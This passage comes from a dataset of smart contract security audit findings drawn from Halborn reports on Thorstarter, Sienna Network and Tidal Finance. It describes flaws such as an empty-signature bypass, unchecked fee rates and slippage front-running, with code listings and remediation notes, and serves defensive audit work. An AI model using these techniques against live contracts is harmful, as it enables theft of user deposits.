], \" not tcLpKeeper \" ); require ( users . length == amounts . length && users . length == values . length , \" length \" ); for ( uint i = 0; i < users . length ; i ++) { address user = users [ i ]; UserInfo storage userInfo = _userInfo ( user ); _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; uint previousValue = userInfo . lockedTcLpValue ; totalSupply = totalSupply - previousValue + values [ i ]; _votes [ userInfo . delegate ] = _votes [ userInfo . delegate ] - previousValue + values [i ]; userInfo . lockedTcLpValue = values [ i ]; userInfo . lockedTcLpAmount = amounts [i ]; if ( previousValue < values [ i ]) { emit Transfer ( address (0) , msg . sender , values [ i] - previousValue ); } else { 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 37 emit Transfer ( msg . sender , address (0) , previousValue - values [i ]) ; 280 281 282 283 } } } Listing 18: Voters.sol 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 function _userInfo ( address user ) private returns ( UserInfo storage ) { UserInfo storage userInfo = _userInfos [ user ]; if ( userInfo . delegate == address (0) ) { userInfo . delegate = user ; } if ( userInfo . lastFeeGrowth == 0) { userInfo . lastFeeGrowth = lastFeeGrowth ; } else { uint fees = ( _userInfoTotal ( userInfo ) * ( lastFeeGrowth - userInfo . lastFeeGrowth )) / 1 e12 ; if ( fees > 0) { _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; totalSupply += fees ; userInfo . lockedToken += fees ; userInfo . lastFeeGrowth = lastFeeGrowth ; _votes [ userInfo . delegate ] += fees ; emit Transfer ( address (0) , user , fees ); } } return userInfo ; } Risk Level: Likelihood - 3 Impact - 2 38 Recommendation: Add proper address validation when every state variable assignment is done from user supplied input. Remediation Plan: SOLVED: Thorstarter Team added address validation to all the untrusted functions: delegate(), _userInfo() 39 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Low"]}, {"title": "CHECK VARIABLE IS NOT EQUAL TO ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the function lockSslp() the variable lpTokenSupply is used as denominator in a division. This variable should be checked that is different than zero. Code Location: Listing 19: Voters.sol (Lines 226,228) 223 // Calculated updated * full * LP amount value and set ( not increment ) 224 // We do it like this and not based on just amount added so that unlock 225 // knows that the lockedSsLpValue is based on one rate and not multiple adds 226 uint lpTokenSupply = sushiLpToken . totalSupply () ; 227 uint lpTokenReserve = token . balanceOf ( address ( sushiLpToken )) ; 228 uint amount = (2 * userInfo . lockedSsLpAmount * lpTokenReserve ) / lpTokenSupply ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add a require statement that checks that the variable lpTokenSupply is not equal to zero. 40 Remediation Plan: SOLVED: Thorstarter Team rightly added the require statement that checks that the variable lpTokenSupply is not equal to zero. 41 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Informational"]}, {"title": "MISSING REQUIRE STATEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the function unlockSslp(), in order to save some gas, a require statement could be added at the beginning of the function as there is nothing to do/decrement if the lpAmount equals to zero. Code Location: Listing 20: Voters.sol (Lines 255) 239 function unlockSslp ( uint lpAmount ) external { 240 241 UserInfo storage userInfo = _userInfo ( msg . sender ); require ( lpAmount <= userInfo . lockedSsLpAmount , \" locked balance too low \" ); 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 } _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ msg . sender ], balanceOf ( msg . sender )); _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; // Proportionally decrement lockedSsLpValue & supply & delegated votes uint amount = lpAmount * userInfo . lockedSsLpValue / userInfo . lockedSsLpAmount ; totalSupply -= amount ; userInfo . lockedSsLpValue -= amount ; userInfo . lockedSsLpAmount -= lpAmount ; _votes [ userInfo . delegate ] -= amount ; emit Transfer ( msg . sender , address (0) , amount ); if ( lpAmount > 0) { sushiLpToken . safeTransfer ( msg . sender , lpAmount ); } 42 Risk Level: Likelihood - 1 Impact - 2 Recommendation: Add a require statement that checks that lpAmount is not zero at the beginning of the function. Example code Listing 21: Voters.sol (Lines 240,256) 239 function unlockSslp ( uint lpAmount ) external { 240 241 242 require ( lpAmount > 0, \" lpAmount == 0 \"); UserInfo storage userInfo = _userInfo ( msg . sender ); require ( lpAmount <= userInfo . lockedSsLpAmount , \" locked balance too low \" ); 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 } _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ msg . sender ], balanceOf ( msg . sender )); _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; // Proportionally decrement lockedSsLpValue & supply & delegated votes uint amount = lpAmount * userInfo . lockedSsLpValue / userInfo . lockedSsLpAmount ; totalSupply -= amount ; userInfo . lockedSsLpValue -= amount ; userInfo . lockedSsLpAmount -= lpAmount ; _votes [ userInfo . delegate ] -= amount ; emit Transfer ( msg . sender , address (0) , amount ); sushiLpToken . safeTransfer ( msg . sender , lpAmount ); 43 Remediation Plan: SOLVED: Thorstarter Team rightly added the require statement that checks that lpAmount is not zero. 44 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Informational"]}, {"title": "SIGNATURE VALIDATION CAN BE BYPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ensure_correct_signature function in contracts/factory/src/contract.rs is the responsible to validate temporary signatures in factory contract and ensure the following scenarios: 1. Exchanges can be created by any user through create_exchange func- tion in factory contract. Other methods like initializing exchange contract directly would not work because of signature validation. 2. IDOs can be created by admin or whitelisted users through create_ido function in factory contract. Other methods like initializing ido contract directly would not work because of signature validation. 3. Launchpad can be created once (if it does not exist yet) by admin through create_launchpad function in factory contract. Other methods like initializing launchpad contract directly would not work because of signature validation. However, an attacker can completely bypass signature validation using '' (no space) as a signature because of incorrect use of unwrap_or_default This situation can produce the in ensure_correct_signature function. following consequences:  (Malicious) exchanges can be created with valid pair of tokens using register_exchange function in factory contract, which could be harm- ful for users because the creator of a fake exchange could completely withdraw tokens from the contract and steal users deposits.  Although these malicious exchanges would not appear directly in Sienna webpage because of filters used in their backend, they will appear as legitimate ones if other users query factory contract about existent exchanges using list_exchanges function. 13  On the other hand, once a (malicious) exchange is created with a specific pair of tokens, no one can create a valid exchange with those tokens anymore because they remain as already registered in factory contract storage.  Any user can create (malicious) IDOs using register_ido function in factory contract, completely bypassing admin / whithelisted user authorization checks. This newly created IDOs will appear as le- gitimate ones if other users query factory contract about existent IDOs using list_idos function.  Any user can create a (malicious) launchpad using register_launchpad function in factory contract, completely bypassing admin authoriza- tion check. This newly created launchpad will appear as legitimate one if other users query factory contract about launchpad address Besides, once the attacker using get_launchpad_address function. creates the (malicious) launchpad, admin will not be able to create a valid one. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 1: contracts/factory/src/contract.rs (Line 544) 543 fn ensure_correct_signature ( storage : & mut impl Storage , signature : Binary ) -> StdResult <() > { let stored_signature : Binary = load ( storage , EPHEMERAL_STORAGE_KEY ) ?. unwrap_or_default () ; if stored_signature ! = signature { return Err ( StdError :: unauthorized () ); } remove ( storage , EPHEMERAL_STORAGE_KEY ); Ok (() ) 544 545 546 547 548 549 550 551 552 553 } 14 Risk Level: Likelihood - 4 Impact - 5 Recommendation: Update the logic of ensure_correct_signature function to use ok_or_else instead of unwrap_or_default to recover stored signature. Remediation plan: SOLVED: The issue was fixed in commit b6290c639ba4ef02fea97313d5154e800b809cb0. 15 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: High"]}, {"title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "init function in contracts/exchange/src/contract.rs and create_exchange function in contracts/factory/src/contract.rs allow the possibility to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. This issue happens because when a pair is compared with another one, if their contract_addr are the same but their token_code_hash differ just in their upper / lower cases, these pairs will appear as different values. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 2: contracts/exchange/src/contract.rs (Line 53) deps : & mut Extern <S , A , Q >, env : Env , msg : InitMsg , 48 pub fn init < S: Storage , A : Api , Q: Querier >( 49 50 51 52 ) -> StdResult < InitResponse > { 53 54 55 56 57 return Err ( StdError :: generic_err ( if msg . pair .0 == msg . pair .1 { )); } \" Trying to create an exchange with the same token . \" , Listing 3: contracts/factory/src/contract.rs (Line 175) 169 pub fn create_exchange < S: Storage , A: Api , Q: Querier >( 170 171 deps : & mut Extern <S , A , Q >, env : Env , 16 pair : TokenPair < HumanAddr >, entropy : Binary , 172 173 174 ) -> StdResult < HandleResponse > { 175 if pair .0 == pair .1 { 176 177 178 179 )); } return Err ( StdError :: generic_err ( \" Cannot create an exchange with the same token . \" , Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of init and create_exchange functions to compare pairs only by their contract_addr value. Remediation plan: SOLVED: The issue was fixed in commit 57673cbe2aa9777b574095b2a68f8f7f4e792027. The Sienna.Network team updated the logic of PartialEq implementation for make comparisons of pairs only by contract_addr or denom values (depending on token type). libraries/amm-shared/src/token_type.rs TokenType in to 17 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: High"]}, {"title": "UNRESTRICTED CHANGES IN FEE RATES LEAD TO TOKENS LOSS / DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "init and set_config functions in contracts/factory/src/contract.rs change the values of all fields in ExchangeSettings directly, so do not restrict that values of swap_fee and sienna_fee are greater or equal than a maximum threshold. This situation can produce the following consequences:  A malicious (or compromised) admin can change temporarily sienna_fee to a very high value, e.g.: 99/100, and transfer all high commissions generated in swapping operations to his account (sienna_burner).  If total fee (swap_fee + sienna_fee) exceeds 1, swapping operations will always panic, thus generating a denial of service (DoS) in Sienna.Network protocol. Code Location: ExchangeSettings struct contains swap_fee and sienna_fee fields, whose type is Fee struct: Listing 4: libraries/amm-shared/src/exchange.rs (Lines 38,39) 37 pub struct ExchangeSettings <A > { 38 39 40 41 } pub swap_fee : Fee , pub sienna_fee : Fee , pub sienna_burner : Option <A >, 18 Fee struct represents a fraction with nom and denom fields: Listing 5: libraries/amm-shared/src/exchange.rs (Lines 73,74) 72 pub struct Fee { pub nom : u8 , 73 74 pub denom : u16 , 75 } init function calls from_init_msg function, which does not restrict that initial values of swap_fee and sienna_fee are greater or equal than a maximum threshold: Listing 6: contracts/factory/src/contract.rs (Line 46) let admin = msg . admin . clone () . unwrap_or ( env . message . sender ); save_admin ( deps , & admin ) ?; deps : & mut Extern <S , A , Q >, env : Env , msg : InitMsg , 37 pub fn init < S: Storage , A : Api , Q: Querier >( 38 39 40 41 ) -> StdResult < InitResponse > { 42 43 44 45 46 47 48 49 } Ok ( InitResponse :: default () ) save_prng_seed (& mut deps . storage , & msg . prng_seed ) ?; save_config ( deps , & Config :: from_init_msg ( msg )) ?; Listing 7: contracts/factory/src/state.rs (Line 48) pub fn from_init_msg ( msg : InitMsg ) -> Self { Self { 40 impl Config < HumanAddr > { 41 42 43 44 45 46 47 48 49 } snip20_contract : msg . snip20_contract , lp_token_contract : msg . lp_token_contract , pair_contract : msg . pair_contract , launchpad_contract : msg . launchpad_contract , ido_contract : msg . ido_contract , exchange_settings : msg . exchange_settings , 19 set_config function does not restrict that new values of swap_fee and sienna_fee are greater or equal than a maximum threshold: Listing 8: contracts/factory/src/contract.rs (Line 133) 132 133 134 if let Some ( new_value ) = exchange_settings { config . exchange_settings = new_value ; } Risk Level: Likelihood - 2 Impact - 5 Recommendation: Add a validation routine inside init and set_config functions to ensure that value of sienna_fee is lesser than a maximum threshold hardcoded in factory contract and total fee (swap_fee + sienna_fee) is lesser than 1. Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding, also stated that if for whatever reason a mistake is made, it can quickly be corrected. 20 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "ADDING LIQUIDITY TO NEW POOLS DOES NOT WORK PROPERLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users call add_liquidity function in contracts/exchange/src/con- tract.rs to add liquidity to new pools (i.e.: pools with no deposits), the assert_slippage_tolerance function is triggered and will always panic if slippage is specified at the beginning of the operation. This situation can produce the following consequences:  When legitimate users try to add liquidity to new pools, operations will always panic and make users spend transactions fees needlessly.  To force a new pool to work as expected, a user should transfer tokens directly to the pool without receiving LP tokens in return, and with the risk that another users benefit from his deposit.  The issues explained above will arise every time a new pool is created (or when its deposits become 0) and legitimate users try to add liquidity. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 9: contracts/exchange/src/contract.rs (Lines 723,727) 720 721 722 723 724 725 726 if decimal_math :: decimal_multiplication ( Decimal :: from_ratio ( deposits [0] , deposits [1]) , one_minus_slippage_tolerance , ) > Decimal :: from_ratio ( pools [0] , pools [1]) || decimal_math :: decimal_multiplication ( Decimal :: from_ratio ( deposits [1] , deposits [0]) , one_minus_slippage_tolerance , 21 727 728 729 730 731 732 { } ) > Decimal :: from_ratio ( pools [1] , pools [0]) return Err ( StdError :: generic_err ( \" Operation exceeds max slippage tolerance \" , )); Risk Level: Likelihood - 5 Impact - 2 Recommendation: Update the logic of assert_slippage_tolerance function to handle correctly the case where a pool has no deposits and slippage is specified as an argument of the function. Remediation plan: SOLVED: The issue was fixed in commit 55e2f9770584cecf06ee37d15c253900de1a1d48. 22 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY OR SWAPPING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users add liquidity / swap and do not specify slippage tolerance (or its equivalent) in the operation, Sienna.Network AMM protocol does not enforce a default maximum threshold, which could severely affect users amount of tokens received in return. This issue can produce the following scenarios: Scenario #1: Adding liquidity  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return.  User A sends a transaction to provide liquidity of 80 token X and 20 token Y to the pool, so he expects to receive 40 LP in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives 16 LP in return, instead of 40 LP he was expecting, i.e.: less than 50%. Scenario #2: Adding liquidity (imbalanced token pair) If a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced token pair, he could lose all his surplus of tokens. See the following example:  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return. 23  User A provides liquidity of 80 token X and 20 token Y to the pool, so he receives 40 LP in return.  User B provides liquidity of 80 token X and 2000 token Y, he also receives 40 LP in return, the same amount of LP tokens than previous transaction, but spending 100 times more token B. Scenario #3: Swapping  Someone creates a pool with 8000 token X and 2000 token Y.  User A sends a transaction to swap 100 token X and expects to receive ~25 token Y in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives ~4 token Y in return, instead of ~25 token Y he was expecting, i.e.: less than 20% of expected value. Some recent DeFi attacks as occurred to BT.Finance or Saddle Finance show the importance to have a maximum predefined slippage to reduce the impact of tokens loss if unexpected situations appear or attackers compromise smart contracts in a platform. Code Location: When users add liquidity to a pool, assert_slippage_tolerance function will always return Ok(()) if slippage is not specified: Listing 10: contracts/exchange/src/contract.rs (Lines 712,713) 707 fn assert_slippage_tolerance ( 708 709 710 711 ) -> StdResult <() > { slippage : Option < Decimal >, deposits : &[ Uint128 ; 2] , pools : &[ Uint128 ; 2] , 24 712 713 714 if slippage . is_none () { return Ok (() ) ; } When users try to swap, swap function does not verify if difference between expected value and return value is within a default maximum threshold when expected_return is not specified in the operation: Listing 11: contracts/exchange/src/contract.rs (Line 461) 458 let settings = query_exchange_settings ( querier , config . factory_info . clone () ) ?; 459 460 461 462 463 464 465 466 467 let swap = do_swap ( querier , & config , & settings , & offer , false ) ?; if let Some ( expected_return ) = expected_return { if swap . result . return_amount . lt (& expected_return ) { return Err ( StdError :: generic_err ( \" Operation fell short of expected_return \" , )); } } Risk Level: Likelihood - 2 Impact - 4 Recommendation: Enforce the use of a default maximum threshold when users add liquidity or swap, but do not specify slippage tolerance or slippage value is greater than the threshold. As a reference, max slippage for Uniswap Pool and Uniswap Swap is 50%. 25 Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding, also stated that the front-end already pre-calculates the expected_return parameter for swaps and they will also make changes for it to set the slippage tolerance for providing liquidity. 26 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of HandleMsg::Admin message in contracts/factory/src/- contract.rs can set admin of factory contract to an invalid address and inadvertently lose total control of this contract, which cannot be undone in any way. Currently, the admin of factory contract can change the admin address using the aforementioned message in a single transaction and without confirmation from the new address. Code Location: HandleMsg::Admin message in factory is routed to admin_handle function: Listing 12: contracts/factory/src/contract.rs (Line 78) 75 76 77 78 HandleMsg :: AddExchanges { exchanges } => add_exchanges ( deps , env , exchanges ) , HandleMsg :: AddIdos { idos } => add_idos ( deps , env , idos ) , HandleMsg :: AddLaunchpad { launchpad } => add_launchpad ( deps , env , launchpad ) , HandleMsg :: Admin ( msg ) => admin_handle ( deps , env , msg , AdminHandle ) , admin_handle function calls change_admin function: 13: Listing admin/src/admin.rs (Line 18) libraries/fadroma-21.07/scrt-admin/composable- 11 pub fn admin_handle < S: Storage , A: Api , Q: Querier >( 12 13 deps : & mut Extern <S , A , Q >, env : Env , 27 msg : AdminHandleMsg , handle : impl AdminHandle , 14 15 16 ) -> StdResult < HandleResponse > { 17 18 match msg { AdminHandleMsg :: ChangeAdmin { address } = > handle . change_admin ( deps , env , address ) } 19 20 } change_admin function saves the new admin address in a single transaction: Listing 14: admin/src/admin.rs (Line 40) libraries/fadroma-21.07/scrt-admin/composable- fn change_admin < S: Storage , A: Api , Q: Querier >( & self , deps : & mut Extern <S , A , Q >, env : Env , address : HumanAddr , ) -> StdResult < HandleResponse > { assert_admin ( deps , & env ) ?; save_admin ( deps , & address ) ?; 32 pub trait AdminHandle { 33 34 35 36 37 38 39 40 41 42 43 44 } } Ok ( HandleResponse :: default () ) Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split admin transfer functionality into set_admin and accept_admin functions. The latter function allows the transfer to be completed by the recipient. 28 Remediation plan: SOLVED: The issue was fixed in commit d92bf78c98f29c9eab73cf32a135ebb0600ffec4. 29 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "EXCHANGES MIGRATION MECHANISM IS NOT COMPLETE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a new factory is deployed to replace an old one, it is mandatory to consider the following steps: 1. Exchanges be must contract. add_exchanges function in contracts/factory/src/contract.rs can be used by admin to complete this step. registered factory new the in 2. Factory address in all exchanges deployed must be updated; otherwise, changes in new factory (e.g.: fee rates) wont affect any exchange. Currently, there are no mechanisms in factory or exchange contracts to complete this step. Code Location: Listing 15: contracts/factory/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , exchanges : Vec < Exchange < HumanAddr >> , 441 #[ require_admin ] 442 fn add_exchanges < S : Storage , A: Api , Q: Querier >( 443 444 445 446 ) -> StdResult < HandleResponse > { 447 448 449 450 451 452 453 454 } messages : vec! [] , log : vec! [ log ( \" action \" , \" add_exchanges \")] , data : None , store_exchanges ( deps , exchanges ) ?; Ok ( HandleResponse { }) 30 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Update the exchanges migration mechanism to allow a mass migration pro- cess with security considerations, e.g.: restrict address that partici- pate in the migration, use temporary password, etc. It is also important that this mechanism updates factory address in all exchanges deployed. Remediation plan: SOLVED: The following commits fixed the security issue:  1eda85cae42125cc327691cc31e59728ecb4cfe0  43ead12b75aa74bf6cecd342d390206f63eea86f  6d08465d71364877e892a383a7d5f9bb51c2c272  835aed6b9c2ef76dc4abd90c2c7a1cbbe96fc5a8 31 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Low"]}, {"title": "POSSIBILITY TO CREATE FAKE PAIRS WITH NATIVE COINS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An attacker can create a pool with a pair that contains a fake native token trying to imitate a real one, e.g.: denom in native token uses 'USCRT' / 'Uscrt' / 'uSCRT' / . . . as value instead of 'uscrt', as shown in the following example:  Token 1: { custom_token: {...} }  Token 2: { native_token: { denom: 'USCRT'} } This pool is created and will appear as a legitimate one in factory contract, and when users try to add liquidity to the pool, operations will always fail and make users spend transactions fees needlessly. This issue happens because generate_pair_key function in contracts/fac- tory/src/state.rs does not restrict that denom in native tokens use upper case letters. Code Location: Listing 16: contracts/factory/src/state.rs (Lines 290,295) 286 pub ( crate ) fn generate_pair_key ( pair : & TokenPair < CanonicalAddr >) -> Vec < u8 > { let mut bytes : Vec <&[ u8 ]> = Vec :: new () ; match & pair .0 { TokenType :: NativeToken { denom } => bytes . push ( denom . as_bytes () ) , TokenType :: CustomToken { contract_addr , .. } => bytes . push ( contract_addr . as_slice () ) , } match & pair .1 { TokenType :: NativeToken { denom } => bytes . push ( denom . 287 288 289 290 291 292 293 294 295 32 as_bytes () ) , TokenType :: CustomToken { contract_addr , .. } => bytes . push ( contract_addr . as_slice () ) , 296 297 } Risk Level: Likelihood - 3 Impact - 1 Recommendation: Update the logic of generate_pair_key function to throw an error message when denom in native tokens use upper case letters. Remediation plan: SOLVED: The issue was fixed in commit 0255154665c3b034bab328efb0abdb142adb4376. 33 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Low"]}, {"title": "PARTIALEQ FOR TOKENPAIR IS WRONGLY IMPLEMENTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "implementation The libraries/amm- shared/src/token_pair.rs makes wrong comparisons between two TokenPair, as shown in the following example: PartialEq TokenPair for of in Example of comparison: 1. pair = (A, B) 2. pair2 = (A, A) 3. When pair is compared against pair2, the test fails because the comparison concludes that values are different: 34 4. However, when pair2 is compared against pair, the test succeeds because the comparison wrongly concludes that values are equal: Although the vulnerability is not exploitable in current codebase, it is important to solve it because it is inside a library, and as such, it could be wrongly used in later iterations of the codebase and generates unexpected situations. Code Location: Listing 17: libraries/amm-shared/src/token_pair.rs (Line 80) 78 impl <A : PartialEq > PartialEq for TokenPair <A > { 79 80 fn eq (& self , other : & TokenPair <A >) -> bool { ( self .0 == other .0 || self .0 == other .1) && ( self .1 == other .0 || self .1 == other .1) } 81 82 } Risk Level: Likelihood - 1 Impact - 2 35 Recommendation: Update the implementation of PartialEq to make adequate comparisons be- tween TokenPair values. Below is a proposed sample code: Listing 18: Sample code for TokenPair comparison 1 impl <A : PartialEq > PartialEq for TokenPair <A > { 2 3 fn eq (& self , other : & TokenPair <A >) -> bool { ( self .0 == other .0 && self .1 == other .1) || ( self .0 == other .1 && self .1 == other .0) } 4 5 } Remediation plan: SOLVED: The issue was fixed in commit 9826e90b55961f18c47ed355d7b2fe9c07190739. 36 3.10 (HAL-10) SPREAD AMOUNT IS CALCULATED BUT NOT USED - INFORMATIONAL ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to The types a local variable. bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Using return does not trigger the bug. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met:  Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable.  There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, your code is NOT affected:  All the structs or arrays only use uint256 or int256 types. If you 14 only use integer types (that may be shorter) and only encode at most one array at a time. If you only return such data and do not use it in abi.encode, external calls or event data. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and- abiencoderv2-bug/ ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitation. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Code Location: GovernorAlpha.sol Line #14 Listing 1: GovernorAlpha.sol (Lines 15) 14 pragma solidity 0.6.12; 15 pragma experimental ABIEncoderV2 ; Staking.sol Line #3 Listing 2: Staking.sol (Lines 3) 3 pragma solidity 0.6.12; 4 pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 2 Impact - 2 15 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation Plan: RISK ACCEPTED: Tidal.Finance accepts the use of ABIEncoderV2 in view functions and for parsing structured data. 16 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Low"]}, {"title": "MISSING ACCESS CONTROL ON THE TRUSTED FORWARDER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "During the tests, It has been observed that, only owner check is missing on the setTrustedForwarder function. Code Location: Registry.sol Line #123 Listing 3: Registry.sol (Lines 123) 123 124 125 function setTrustedForwarder ( address trustedForwarder_ ) external { trustedForwarder = trustedForwarder_ ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to implement access control in that function. Remediation Plan: SOLVED: Tidal.Finance implemented access control in setTrustedForwarder function in commit b7dae61079b1dddd913b819ace516b9f0fd83a92. 17 ", "labels": ["Halborn", "Tidal_Finances", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf", "body": "In the Registry.sol contract the function does not emit event after the Events are a method of informing the transaction initiator progress. It logs its emitted about the actions taken by the called function. parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: Registry.sol Line #~46-125 Listing 4: Registry.sol (Lines ) 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 function setTimeExtra ( uint256 timeExtra_ ) function setBuyer ( address buyer_ ) function setSeller ( address seller_ ) function setGuarantor ( address guarantor_ ) function setStaking ( address staking_ ) function setBonus ( address bonus_ ) function setTidalToken ( address tidalToken_ ) function setBaseToken ( address baseToken_ ) function setAssetManager ( address assetManager_ ) function setPremiumCalculator ( address premiumCalculator_ ) function setPlatform ( address platform_ ) function setGuarantorPercentage ( uint256 percentage_ ) function setPlatformPercentage ( uint256 